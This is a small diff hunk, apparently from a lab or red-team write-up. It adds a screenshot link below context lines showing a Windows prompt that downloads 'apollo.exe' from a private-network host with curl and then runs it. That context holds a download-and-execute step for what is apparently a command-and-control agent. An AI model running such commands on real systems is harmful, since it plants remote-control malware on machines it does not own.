@@ -178,6 +178,7 @@ C:\Users\mirei\Downloads>curl http://192.168.17.141:8000/apollo.exe -o apollo.ex
 C:\Users\mirei\Downloads>apollo.exe
 
 <img width="1026" height="436" alt="image" src="https://github.com/user-attachments/assets/73535554-fdca-43ae-ad8d-7d6d6e72714e" />
+<img width="589" height="311" alt="my" src="https://github.com/user-attachments/assets/c68db709-1162-4f15-a377-cdd6a86dbcd8" />
 
 
 
